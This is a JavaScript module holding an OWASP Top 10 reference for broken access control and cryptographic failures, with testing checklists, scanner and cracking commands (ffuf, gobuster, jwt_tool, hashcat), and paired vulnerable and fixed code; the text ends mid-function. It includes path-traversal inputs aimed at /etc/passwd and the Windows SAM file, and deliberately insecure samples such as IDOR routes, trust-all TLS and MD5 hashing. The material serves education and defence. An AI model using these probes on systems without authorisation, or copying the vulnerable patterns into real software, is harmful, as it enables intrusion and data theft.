/**
 * =============================================================================
 * OWASP Top 10 (2021) -- Comprehensive Security Reference
 * =============================================================================
 *
 * Copyright (c) 2024-2026 Darknode Project
 * All rights reserved.
 *
 * This file provides an exhaustive reference for each OWASP Top 10 (2021)
 * vulnerability category, including testing methodologies, tool commands,
 * vulnerable and fixed code examples across multiple languages, real-world
 * case studies, and remediation guidance.
 *
 * Source: https://owasp.org/Top10/
 *
 * NOTICE: This material is provided for authorized security testing and
 * educational purposes only. Unauthorized access to computer systems is
 * illegal. Always obtain proper authorization before testing.
 *
 * =============================================================================
 */

export const OWASP_TOP_10 = [

  // =========================================================================
  // A01:2021 - Broken Access Control
  // =========================================================================
  {
    id: 'A01',
    name: 'Broken Access Control',
    description:
      'Access control enforces policy such that users cannot act outside their intended ' +
      'permissions. Failures typically lead to unauthorized information disclosure, ' +
      'modification, or destruction of data, or performing business functions outside ' +
      'the user\'s limits. Broken access control moved from the fifth position in 2017 ' +
      'to the most critical category in 2021, with 94% of applications tested showing ' +
      'some form of broken access control. Notable CWEs include CWE-200 (Exposure of ' +
      'Sensitive Information), CWE-201 (Insertion of Sensitive Information Into Sent Data), ' +
      'and CWE-352 (Cross-Site Request Forgery).',

    impact:
      'Attackers can gain unauthorized access to other users\' accounts, view sensitive ' +
      'files, modify other users\' data, change access rights, escalate privileges to ' +
      'admin-level access, and perform actions on behalf of other users. In severe cases, ' +
      'broken access control can lead to complete system compromise, data breaches ' +
      'affecting millions of records, regulatory violations (GDPR, HIPAA, PCI-DSS), ' +
      'and significant financial and reputational damage.',

    examples: [
      'Violation of the principle of least privilege: access granted to all users instead of specific roles',
      'Bypassing access control checks by modifying the URL, internal application state, or HTML page',
      'Permitting viewing or editing someone else\'s account by providing its unique identifier (IDOR)',
      'Accessing API endpoints with missing access controls for POST, PUT, DELETE operations',
      'Elevation of privilege: acting as a user without being logged in, or acting as admin when logged in as regular user',
      'Metadata manipulation: replaying or tampering with JWT tokens, cookies, or hidden fields to elevate privileges',
      'CORS misconfiguration allowing API access from unauthorized or untrusted origins',
      'Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user',
      'Missing access control on static resources (documents, images, backups)',
      'Horizontal privilege escalation: accessing resources belonging to other users at the same privilege level',
      'Vertical privilege escalation: a regular user accessing admin functionality',
      'Path traversal to access files outside intended directories',
      'Parameter tampering to bypass access controls (e.g., changing role=user to role=admin)',
      'Missing function-level access control: API endpoints not verifying user roles',
      'Insecure direct object references in file download functionality',
    ],

    testingGuide: [
      '1. Map all application entry points and identify resources requiring access control',
      '2. Create test accounts at each privilege level (unauthenticated, regular user, moderator, admin)',
      '3. Attempt accessing each privileged resource/function using lower-privilege accounts',
      '4. Test IDOR by modifying resource IDs in URLs: /api/users/123 -> /api/users/124',
      '5. Test IDOR in request bodies: change user_id, account_id, order_id parameters',
      '6. Test IDOR with encoded values: Base64-encoded IDs, hashed IDs, UUIDs',
      '7. Test HTTP method tampering: change GET to POST, PUT, DELETE, PATCH, OPTIONS',
      '8. Test for forced browsing to admin pages: /admin, /management, /console, /dashboard',
      '9. Test path traversal: ../../etc/passwd, ..\\..\\windows\\system32\\config\\sam',
      '10. Remove or modify authorization headers and re-send requests',
      '11. Test with expired, revoked, or manipulated JWT tokens',
      '12. Swap JWT tokens between users to test horizontal escalation',
      '13. Modify JWT payload claims (role, sub, iss) without re-signing',
      '14. Test for JWT algorithm confusion (RS256 to HS256, none algorithm)',
      '15. Test CORS: send requests from unauthorized origins and check Access-Control-Allow-Origin',
      '16. Test for missing CSRF tokens on state-changing operations',
      '17. Test directory listing: browse to /uploads/, /static/, /backup/',
      '18. Test for parameter pollution: add duplicate parameters with different values',
      '19. Test API endpoints without authentication tokens',
      '20. Test for race conditions in access control checks (TOCTOU)',
      '21. Test multi-step operations: skip intermediate authorization steps',
      '22. Test for insecure randomness in session tokens or resource identifiers',
      '23. Test object-level authorization: can user A modify user B\'s objects?',
      '24. Test function-level authorization: can regular users call admin API endpoints?',
      '25. Test field-level authorization: can users modify fields they shouldn\'t (e.g., price, role)?',
      '26. Test for privilege escalation via user registration (setting admin flag during signup)',
      '27. Test for access control bypass via HTTP header injection (X-Forwarded-For, X-Original-URL)',
      '28. Test for access control bypass via URL encoding (%2e%2e%2f for ../)',
      '29. Test for access control bypass via null bytes (%00 in file paths)',
      '30. Test for access control bypass via case sensitivity (/Admin vs /admin)',
      '31. Test for missing re-authentication on sensitive operations (password change, email change)',
      '32. Test for insecure handling of OAuth state parameter',
      '33. Test for access control in GraphQL queries (nested object authorization)',
      '34. Test for access control in WebSocket connections',
      '35. Test for access control in file upload functionality (overwriting other users\' files)',
    ],

    tools: [
      'Burp Suite: Intercept and modify requests, use Autorize extension for automated access control testing',
      'OWASP ZAP: Active scanner with access control testing rules, forced browse plugin',
      'Postman: Manual API testing with different authentication tokens per collection',
      'curl: curl -H "Authorization: Bearer <token_user_b>" https://api.example.com/users/123',
      'ffuf: ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302',
      'gobuster: gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
      'feroxbuster: feroxbuster -u https://example.com -w wordlist.txt --depth 3',
      'Autorize (Burp extension): Automated authorization enforcement detection',
      'jwt_tool: python3 jwt_tool.py <token> -T -S hs256 -p "secret"',
      'Nuclei: nuclei -u https://example.com -t cves/ -t vulnerabilities/access-control/',
      'Arjun: arjun -u https://example.com/api/endpoint -m POST (parameter discovery)',
      'ParamSpider: paramspider -d example.com (URL parameter mining)',
      'dirsearch: dirsearch -u https://example.com -e php,asp,aspx,jsp,html',
      'wfuzz: wfuzz -z range,1-1000 --hc 404 https://example.com/api/users/FUZZ',
      'httpx: echo "example.com" | httpx -path "/admin" -mc 200 -title',
    ],

    remediation: [
      'Implement server-side access control checks -- never rely solely on client-side controls',
      'Deny by default: all access should be denied unless explicitly granted',
      'Implement role-based access control (RBAC) or attribute-based access control (ABAC)',
      'Use a centralized access control mechanism rather than scattered checks throughout the code',
      'Enforce record ownership: users should only access their own records unless explicitly authorized',
      'Disable web server directory listing and ensure metadata files (.git, .svn) are not accessible',
      'Log and alert on access control failures; implement rate limiting on repeated failures',
      'Invalidate server-side sessions on logout; JWT tokens should have short expiration times',
      'Implement proper CORS configuration: restrict allowed origins to trusted domains only',
      'Use anti-CSRF tokens for all state-changing operations',
      'Implement re-authentication for sensitive operations (password change, fund transfers)',
      'Use indirect object references (map user-facing IDs to internal IDs server-side)',
      'Implement access control unit and integration tests as part of CI/CD pipeline',
      'Use UUIDs instead of sequential integers for resource identifiers',
      'Apply the principle of least privilege at every layer (application, database, OS)',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: IDOR in Python Flask',
        language: 'python',
        vulnerable: `
@app.route('/api/users/<int:user_id>/profile')
def get_profile(user_id):
    # No authorization check -- any authenticated user can view any profile
    user = User.query.get(user_id)
    return jsonify(user.to_dict())

@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    # Directly fetches order without verifying ownership
    order = Order.query.get(order_id)
    return jsonify(order.to_dict())`,
        fixed: `
@app.route('/api/users/<int:user_id>/profile')
@login_required
def get_profile(user_id):
    # Verify the requesting user owns this profile or is an admin
    if current_user.id != user_id and not current_user.is_admin:
        abort(403, description='Access denied')
    user = User.query.get_or_404(user_id)
    return jsonify(user.to_dict())

@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    # Scope query to current user's orders
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id
    ).first_or_404()
    return jsonify(order.to_dict())`,
      },
      {
        title: 'Vulnerable: Missing Function-Level Access Control in Node.js Express',
        language: 'javascript',
        vulnerable: `
// No middleware checks -- any authenticated user can access admin routes
app.delete('/api/admin/users/:id', (req, res) => {
  User.findByIdAndDelete(req.params.id)
    .then(() => res.json({ message: 'User deleted' }))
    .catch(err => res.status(500).json({ error: err.message }));
});

app.put('/api/admin/settings', (req, res) => {
  Settings.update(req.body)
    .then(() => res.json({ message: 'Settings updated' }))
    .catch(err => res.status(500).json({ error: err.message }));
});`,
        fixed: `
// Middleware to verify admin role
function requireAdmin(req, res, next) {
  if (!req.user) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  if (req.user.role !== 'admin') {
    logger.warn('Unauthorized admin access attempt', {
      userId: req.user.id,
      path: req.path,
      ip: req.ip,
    });
    return res.status(403).json({ error: 'Insufficient privileges' });
  }
  next();
}

app.delete('/api/admin/users/:id', requireAdmin, (req, res) => {
  User.findByIdAndDelete(req.params.id)
    .then(() => {
      logger.info('User deleted by admin', {
        deletedUserId: req.params.id,
        adminId: req.user.id,
      });
      res.json({ message: 'User deleted' });
    })
    .catch(err => res.status(500).json({ error: 'Internal error' }));
});

app.put('/api/admin/settings', requireAdmin, (req, res) => {
  Settings.update(req.body)
    .then(() => res.json({ message: 'Settings updated' }))
    .catch(err => res.status(500).json({ error: 'Internal error' }));
});`,
      },
      {
        title: 'Vulnerable: IDOR in Java Spring Boot',
        language: 'java',
        vulnerable: `
@RestController
@RequestMapping("/api/documents")
public class DocumentController {

    @GetMapping("/{id}")
    public ResponseEntity<Document> getDocument(@PathVariable Long id) {
        // No ownership verification
        Document doc = documentRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("Document not found"));
        return ResponseEntity.ok(doc);
    }

    @DeleteMapping("/{id}")
    public ResponseEntity<?> deleteDocument(@PathVariable Long id) {
        // Any user can delete any document
        documentRepository.deleteById(id);
        return ResponseEntity.ok().build();
    }
}`,
        fixed: `
@RestController
@RequestMapping("/api/documents")
public class DocumentController {

    @GetMapping("/{id}")
    public ResponseEntity<Document> getDocument(
            @PathVariable Long id,
            @AuthenticationPrincipal UserDetails userDetails) {
        Document doc = documentRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("Document not found"));

        // Verify ownership or admin access
        if (!doc.getOwnerId().equals(userDetails.getId())
                && !userDetails.getAuthorities().contains("ROLE_ADMIN")) {
            throw new AccessDeniedException("You do not have access to this document");
        }
        return ResponseEntity.ok(doc);
    }

    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or @documentSecurity.isOwner(#id, authentication)")
    public ResponseEntity<?> deleteDocument(
            @PathVariable Long id,
            @AuthenticationPrincipal UserDetails userDetails) {
        documentRepository.deleteById(id);
        auditLogger.log("Document deleted", id, userDetails.getUsername());
        return ResponseEntity.ok().build();
    }
}`,
      },
      {
        title: 'Vulnerable: JWT Algorithm Confusion in Python',
        language: 'python',
        vulnerable: `
import jwt

def verify_token(token):
    # Accepts any algorithm -- vulnerable to algorithm confusion
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256", "HS256"])
    return payload

def create_token(user):
    payload = {"sub": user.id, "role": user.role}
    return jwt.encode(payload, PRIVATE_KEY, algorithm="RS256")`,
        fixed: `
import jwt
from datetime import datetime, timedelta

def verify_token(token):
    try:
        # Strictly specify the expected algorithm
        payload = jwt.decode(
            token,
            PUBLIC_KEY,
            algorithms=["RS256"],  # Only allow RS256
            options={
                "require": ["exp", "iat", "sub"],
                "verify_exp": True,
                "verify_iat": True,
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthenticationError("Token has expired")
    except jwt.InvalidTokenError:
        raise AuthenticationError("Invalid token")

def create_token(user):
    now = datetime.utcnow()
    payload = {
        "sub": user.id,
        "role": user.role,
        "iat": now,
        "exp": now + timedelta(minutes=15),
        "jti": str(uuid.uuid4()),  # Unique token ID for revocation
    }
    return jwt.encode(payload, PRIVATE_KEY, algorithm="RS256")`,
      },
      {
        title: 'Vulnerable: Missing CORS Configuration in Express',
        language: 'javascript',
        vulnerable: `
// Allows all origins -- any website can make authenticated requests
app.use(cors());

// Or even worse -- reflecting the origin
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});`,
        fixed: `
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com',
];

app.use(cors({
  origin: function(origin, callback) {
    // Allow requests with no origin (mobile apps, curl, etc.)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('CORS policy violation'), false);
    }
    return callback(null, true);
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,
}));`,
      },
      {
        title: 'Vulnerable: Path Traversal in File Download (Python)',
        language: 'python',
        vulnerable: `
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    # Directly using user input in file path
    return send_file(os.path.join('/var/uploads', filename))`,
        fixed: `
import os
from pathlib import Path

UPLOAD_DIR = Path('/var/uploads').resolve()

@app.route('/download')
@login_required
def download_file():
    filename = request.args.get('file', '')

    # Sanitize: remove path separators, null bytes
    safe_name = os.path.basename(filename)
    if not safe_name or safe_name != filename:
        abort(400, description='Invalid filename')

    # Resolve and verify the path stays within the upload directory
    target = (UPLOAD_DIR / safe_name).resolve()
    if not str(target).startswith(str(UPLOAD_DIR)):
        abort(403, description='Access denied')

    if not target.is_file():
        abort(404, description='File not found')

    return send_file(target)`,
      },
      {
        title: 'Vulnerable: GraphQL Authorization Bypass',
        language: 'javascript',
        vulnerable: `
const resolvers = {
  Query: {
    // No authorization -- any user can query any user's data
    user: (_, { id }) => User.findById(id),
    allUsers: () => User.find({}),
    adminStats: () => Stats.getAll(),
  },
  User: {
    // Nested resolvers expose sensitive data
    email: (user) => user.email,
    ssn: (user) => user.ssn,
    creditCards: (user) => CreditCard.find({ userId: user.id }),
  },
};`,
        fixed: `
const resolvers = {
  Query: {
    user: (_, { id }, context) => {
      if (!context.user) throw new AuthenticationError('Login required');
      if (context.user.id !== id && !context.user.isAdmin) {
        throw new ForbiddenError('Access denied');
      }
      return User.findById(id);
    },
    allUsers: (_, __, context) => {
      if (!context.user?.isAdmin) {
        throw new ForbiddenError('Admin access required');
      }
      return User.find({});
    },
    adminStats: (_, __, context) => {
      if (!context.user?.isAdmin) {
        throw new ForbiddenError('Admin access required');
      }
      return Stats.getAll();
    },
  },
  User: {
    email: (user, _, context) => {
      if (context.user.id === user.id || context.user.isAdmin) {
        return user.email;
      }
      return null; // Mask for unauthorized viewers
    },
    ssn: (user, _, context) => {
      if (context.user.isAdmin) return user.ssn;
      return '***-**-' + user.ssn.slice(-4);
    },
    creditCards: (user, _, context) => {
      if (context.user.id !== user.id) {
        throw new ForbiddenError('Access denied');
      }
      return CreditCard.find({ userId: user.id });
    },
  },
};`,
      },
      {
        title: 'Vulnerable: Race Condition in Balance Check (Python)',
        language: 'python',
        vulnerable: `
@app.route('/api/transfer', methods=['POST'])
def transfer():
    amount = request.json['amount']
    to_user = request.json['to_user']
    # TOCTOU: balance checked then updated without locking
    if current_user.balance >= amount:
        current_user.balance -= amount
        to_user_obj = User.query.get(to_user)
        to_user_obj.balance += amount
        db.session.commit()
        return jsonify({'status': 'success'})
    return jsonify({'status': 'insufficient funds'}), 400`,
        fixed: `
from sqlalchemy import text

@app.route('/api/transfer', methods=['POST'])
@login_required
def transfer():
    amount = request.json.get('amount', 0)
    to_user_id = request.json.get('to_user')

    if amount <= 0:
        return jsonify({'error': 'Invalid amount'}), 400

    try:
        # Use database-level locking to prevent race conditions
        result = db.session.execute(text("""
            UPDATE users SET balance = balance - :amount
            WHERE id = :user_id AND balance >= :amount
        """), {'amount': amount, 'user_id': current_user.id})

        if result.rowcount == 0:
            db.session.rollback()
            return jsonify({'error': 'Insufficient funds'}), 400

        db.session.execute(text("""
            UPDATE users SET balance = balance + :amount
            WHERE id = :to_user_id
        """), {'amount': amount, 'to_user_id': to_user_id})

        db.session.commit()
        audit_log('transfer', current_user.id, to_user_id, amount)
        return jsonify({'status': 'success'})
    except Exception:
        db.session.rollback()
        return jsonify({'error': 'Transfer failed'}), 500`,
      },
      {
        title: 'Vulnerable: Missing CSRF Protection in Java Servlet',
        language: 'java',
        vulnerable: `
@WebServlet("/changePassword")
public class ChangePasswordServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request,
                          HttpServletResponse response) throws IOException {
        // No CSRF token validation
        String newPassword = request.getParameter("newPassword");
        String userId = (String) request.getSession().getAttribute("userId");
        userService.changePassword(userId, newPassword);
        response.sendRedirect("/profile?success=true");
    }
}`,
        fixed: `
@WebServlet("/changePassword")
public class ChangePasswordServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request,
                          HttpServletResponse response) throws IOException {
        // Validate CSRF token
        String sessionToken = (String) request.getSession().getAttribute("csrfToken");
        String requestToken = request.getParameter("csrfToken");

        if (sessionToken == null || !MessageDigest.isEqual(
                sessionToken.getBytes(StandardCharsets.UTF_8),
                requestToken.getBytes(StandardCharsets.UTF_8))) {
            response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid CSRF token");
            return;
        }

        // Require current password for re-authentication
        String currentPassword = request.getParameter("currentPassword");
        String userId = (String) request.getSession().getAttribute("userId");

        if (!userService.verifyPassword(userId, currentPassword)) {
            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Invalid current password");
            return;
        }

        String newPassword = request.getParameter("newPassword");
        userService.changePassword(userId, newPassword);

        // Rotate CSRF token after state-changing operation
        request.getSession().setAttribute("csrfToken", generateSecureToken());
        response.sendRedirect("/profile?success=true");
    }
}`,
      },
      {
        title: 'Vulnerable: Insecure Direct Object Reference in File Upload',
        language: 'javascript',
        vulnerable: `
app.post('/api/avatar/upload', upload.single('avatar'), (req, res) => {
  const userId = req.body.userId; // User-controlled
  const filePath = path.join('/uploads/avatars', userId + '.jpg');
  fs.renameSync(req.file.path, filePath);
  res.json({ url: '/avatars/' + userId + '.jpg' });
});`,
        fixed: `
app.post('/api/avatar/upload', authenticate, upload.single('avatar'), (req, res) => {
  // Use authenticated user ID, not user-supplied value
  const userId = req.user.id;
  const ext = path.extname(req.file.originalname).toLowerCase();

  if (!['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'Invalid file type' });
  }

  // Use UUID to prevent predictable filenames
  const filename = uuidv4() + ext;
  const filePath = path.join('/uploads/avatars', filename);
  fs.renameSync(req.file.path, filePath);

  // Update user record with new avatar path
  User.findByIdAndUpdate(userId, { avatar: filename });
  res.json({ url: '/avatars/' + filename });
});`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A01_2021-Broken_Access_Control/',
      'https://cwe.mitre.org/data/definitions/284.html',
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
      'Case Study: Capital One breach (2019) -- SSRF combined with misconfigured IAM role led to 106 million records exposed',
      'Case Study: Facebook IDOR (2018) -- users could view private photos of other users via Graph API',
      'Case Study: Uber privilege escalation (2016) -- internal admin dashboard accessible without proper authorization',
    ],
  },

  // =========================================================================
  // A02:2021 - Cryptographic Failures
  // =========================================================================
  {
    id: 'A02',
    name: 'Cryptographic Failures',
    description:
      'Previously known as "Sensitive Data Exposure," this category focuses on failures ' +
      'related to cryptography (or lack thereof), which often lead to exposure of sensitive ' +
      'data. This includes use of weak or obsolete cryptographic algorithms, improper key ' +
      'management, insufficient entropy, transmission of data in cleartext, use of deprecated ' +
      'hash functions, and missing encryption for data at rest or in transit. Notable CWEs ' +
      'include CWE-259 (Use of Hard-coded Password), CWE-327 (Use of Broken or Risky ' +
      'Cryptographic Algorithm), and CWE-331 (Insufficient Entropy).',

    impact:
      'Exposure of sensitive data including passwords, credit card numbers, health records, ' +
      'personal information, and business secrets. Attackers can perform man-in-the-middle ' +
      'attacks, offline password cracking, session hijacking, and identity theft. Regulatory ' +
      'violations (GDPR Article 32, PCI-DSS Requirement 3/4, HIPAA) can result in fines ' +
      'up to 4% of annual global turnover or $20 million (whichever is greater for GDPR).',

    examples: [
      'Transmitting passwords or sensitive data over HTTP instead of HTTPS',
      'Using deprecated hash algorithms: MD5, SHA-1 for password hashing',
      'Using ECB mode for block cipher encryption (preserves data patterns)',
      'Hard-coded encryption keys or passwords in source code',
      'Using Math.random() or similar non-cryptographic PRNGs for security-sensitive values',
      'Missing TLS on login pages or API endpoints handling sensitive data',
      'Weak TLS configuration: supporting TLS 1.0, TLS 1.1, or weak cipher suites',
      'Self-signed certificates in production environments',
      'Using the same key for encryption and MAC (or reusing IVs/nonces)',
      'Storing passwords using reversible encryption instead of salted hashing',
      'Missing HSTS headers allowing SSL stripping attacks',
      'Certificate pinning not implemented in mobile applications',
      'Using DES, 3DES, RC4, or Blowfish in new implementations',
      'Insufficient key length: RSA < 2048 bits, AES < 128 bits',
      'Passwords stored in base64 encoding (encoding is not encryption)',
      'Sensitive data in URL parameters (logged in server logs, browser history)',
      'Missing encryption for database backups',
      'Using static IVs or predictable nonces in encryption',
      'Client-side storage of sensitive data in localStorage or cookies without encryption',
      'Side-channel vulnerabilities: timing attacks on comparison operations',
      'Lack of perfect forward secrecy in TLS configuration',
      'Using custom/homegrown cryptographic algorithms',
      'Not rotating encryption keys periodically',
      'Exposing stack traces or error messages that reveal cryptographic implementation details',
      'Missing encryption for inter-service communication in microservices',
    ],

    testingGuide: [
      '1. Identify all sensitive data processed, stored, or transmitted by the application',
      '2. Verify HTTPS is enforced on all pages (check for mixed content)',
      '3. Test SSL/TLS configuration: nmap --script ssl-enum-ciphers -p 443 target.com',
      '4. Check for HSTS header: curl -sI https://example.com | grep -i strict-transport',
      '5. Verify certificate validity, chain, and pinning',
      '6. Test for SSL stripping: use sslstrip tool to downgrade connections',
      '7. Check for sensitive data in URLs: review server access logs for query parameters',
      '8. Inspect cookies for Secure and HttpOnly flags',
      '9. Test password storage: attempt to retrieve stored passwords (should be hashed)',
      '10. Verify password hashing uses bcrypt, scrypt, Argon2id, or PBKDF2 with sufficient iterations',
      '11. Check for hard-coded credentials: grep -rn "password\\|secret\\|api_key" --include="*.py" --include="*.js"',
      '12. Test for weak random number generation in tokens and session IDs',
      '13. Verify encryption at rest for databases, file systems, and backups',
      '14. Check for deprecated algorithms: grep for MD5, SHA1, DES, RC4 in codebase',
      '15. Test for proper key management: keys stored separately from encrypted data',
      '16. Verify that cryptographic errors do not reveal information (padding oracle attacks)',
      '17. Test for timing attacks on authentication endpoints',
      '18. Check for missing certificate validation in API clients',
      '19. Verify that sensitive data is not cached (Cache-Control, Pragma headers)',
      '20. Test for proper data masking in logs and error messages',
      '21. Check database connection strings for encryption requirements',
      '22. Verify that development/debug certificates are not used in production',
      '23. Test for BEAST, POODLE, DROWN, ROBOT, Heartbleed vulnerabilities',
      '24. Verify proper use of authenticated encryption (GCM mode, not CBC without MAC)',
      '25. Check for proper entropy sources in cryptographic key generation',
    ],

    tools: [
      'testssl.sh: ./testssl.sh https://example.com (comprehensive TLS testing)',
      'sslyze: sslyze --regular example.com (SSL/TLS configuration analysis)',
      'nmap: nmap --script ssl-enum-ciphers,ssl-heartbleed -p 443 target.com',
      'sslscan: sslscan --no-colour example.com',
      'Qualys SSL Labs: https://www.ssllabs.com/ssltest/ (online TLS grading)',
      'hashcat: hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt (MD5 cracking)',
      'john: john --wordlist=rockyou.txt hashes.txt (password hash cracking)',
      'openssl: openssl s_client -connect example.com:443 -tls1_2',
      'CryptoLyzer: cryptolyze tls1_2 example.com (cryptographic protocol analysis)',
      'trufflehog: trufflehog git https://github.com/org/repo (secret scanning)',
      'gitleaks: gitleaks detect --source=/path/to/repo',
      'detect-secrets: detect-secrets scan --all-files',
      'Burp Suite: passive scanner identifies unencrypted connections and weak crypto',
      'mozilla observatory: observatory cli https://example.com',
      'cipherscan: ./cipherscan example.com (cipher suite enumeration)',
    ],

    remediation: [
      'Classify data processed, stored, or transmitted and identify which is sensitive per regulations',
      'Apply controls as per the classification: do not store sensitive data unnecessarily',
      'Encrypt all sensitive data at rest using AES-256-GCM or ChaCha20-Poly1305',
      'Encrypt all data in transit with TLS 1.2+ (prefer TLS 1.3)',
      'Enforce HTTPS with HSTS (max-age=31536000; includeSubDomains; preload)',
      'Use authenticated encryption modes (GCM, CCM) instead of unauthenticated (ECB, CBC alone)',
      'Hash passwords with Argon2id (preferred), bcrypt (cost >= 12), or scrypt',
      'Use cryptographically secure random number generators for all security values',
      'Disable caching for responses containing sensitive data',
      'Store encryption keys in dedicated key management systems (AWS KMS, HashiCorp Vault, Azure Key Vault)',
      'Implement proper key rotation policies (at least annually, or upon compromise)',
      'Use TLS 1.3 with forward secrecy cipher suites (ECDHE)',
      'Disable legacy protocols and weak cipher suites (SSLv3, TLS 1.0, TLS 1.1, RC4, DES, 3DES)',
      'Set Secure, HttpOnly, and SameSite flags on all cookies',
      'Implement certificate pinning for mobile applications',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: Weak Password Hashing in Python',
        language: 'python',
        vulnerable: `
import hashlib

def store_password(password):
    # MD5 is cryptographically broken -- fast to brute force
    hashed = hashlib.md5(password.encode()).hexdigest()
    db.execute("INSERT INTO users (password_hash) VALUES (?)", [hashed])

def verify_password(password, stored_hash):
    return hashlib.md5(password.encode()).hexdigest() == stored_hash`,
        fixed: `
import argon2
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # Number of iterations
    memory_cost=65536,   # 64 MB memory usage
    parallelism=4,       # 4 parallel threads
    hash_len=32,         # 32-byte hash output
    salt_len=16,         # 16-byte random salt
)

def store_password(password):
    hashed = ph.hash(password)  # Argon2id with random salt
    db.execute("INSERT INTO users (password_hash) VALUES (?)", [hashed])

def verify_password(password, stored_hash):
    try:
        return ph.verify(stored_hash, password)
    except argon2.exceptions.VerifyMismatchError:
        return False
    except argon2.exceptions.InvalidHashError:
        return False`,
      },
      {
        title: 'Vulnerable: Hard-coded Secrets in Node.js',
        language: 'javascript',
        vulnerable: `
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Hard-coded secret -- exposed in source control
const JWT_SECRET = 'my-super-secret-key-12345';
const ENCRYPTION_KEY = 'abcdef1234567890abcdef1234567890';

function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET);
}

function encrypt(data) {
  // Static IV -- reuse makes encryption deterministic
  const iv = Buffer.from('1234567890123456');
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
}`,
        fixed: `
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Load secrets from environment or key management service
const JWT_SECRET = process.env.JWT_SECRET;
const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');

if (!JWT_SECRET || !ENCRYPTION_KEY) {
  throw new Error('Required secrets not configured');
}

function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET, {
    algorithm: 'HS256',
    expiresIn: '15m',
  });
}

function encrypt(data) {
  // Random IV for each encryption operation
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
  const encrypted = Buffer.concat([
    cipher.update(data, 'utf8'),
    cipher.final(),
  ]);
  const authTag = cipher.getAuthTag();
  // Prepend IV and auth tag for decryption
  return Buffer.concat([iv, authTag, encrypted]).toString('base64');
}

function decrypt(encryptedBase64) {
  const buf = Buffer.from(encryptedBase64, 'base64');
  const iv = buf.subarray(0, 16);
  const authTag = buf.subarray(16, 32);
  const encrypted = buf.subarray(32);
  const decipher = crypto.createDecipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
  decipher.setAuthTag(authTag);
  return decipher.update(encrypted, null, 'utf8') + decipher.final('utf8');
}`,
      },
      {
        title: 'Vulnerable: Insecure TLS Configuration in Java',
        language: 'java',
        vulnerable: `
// Disabling certificate verification
TrustManager[] trustAllCerts = new TrustManager[] {
    new X509TrustManager() {
        public X509Certificate[] getAcceptedIssuers() { return null; }
        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
    }
};

SSLContext sc = SSLContext.getInstance("TLS");
sc.init(null, trustAllCerts, new java.security.SecureRandom());
HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

// Disabling hostname verification
HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);`,
        fixed: `
// Use default trust manager with proper certificate verification
SSLContext sc = SSLContext.getInstance("TLSv1.3");
sc.init(null, null, new SecureRandom()); // Uses default trust manager

// Configure connection with proper TLS settings
HttpsURLConnection connection =
    (HttpsURLConnection) new URL(url).openConnection();
connection.setSSLSocketFactory(sc.getSocketFactory());
// Default hostname verifier performs proper verification

// For custom trust store (e.g., internal CA)
KeyStore trustStore = KeyStore.getInstance("PKCS12");
try (FileInputStream fis = new FileInputStream("/path/to/truststore.p12")) {
    trustStore.load(fis, truststorePassword);
}
TrustManagerFactory tmf = TrustManagerFactory.getInstance(
    TrustManagerFactory.getDefaultAlgorithm());
tmf.init(trustStore);
SSLContext customSc = SSLContext.getInstance("TLSv1.3");
customSc.init(null, tmf.getTrustManagers(), new SecureRandom());`,
      },
      {
        title: 'Vulnerable: Weak Random Number Generation in Python',
        language: 'python',
        vulnerable: `
import random
import string

def generate_reset_token():
    # random module uses Mersenne Twister -- predictable PRNG
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    return token

def generate_session_id():
    # Predictable, can be reverse-engineered
    return str(random.randint(100000, 999999))`,
        fixed: `
import secrets
import string

def generate_reset_token():
    # secrets module uses OS-level CSPRNG
    return secrets.token_urlsafe(32)  # 256 bits of entropy

def generate_session_id():
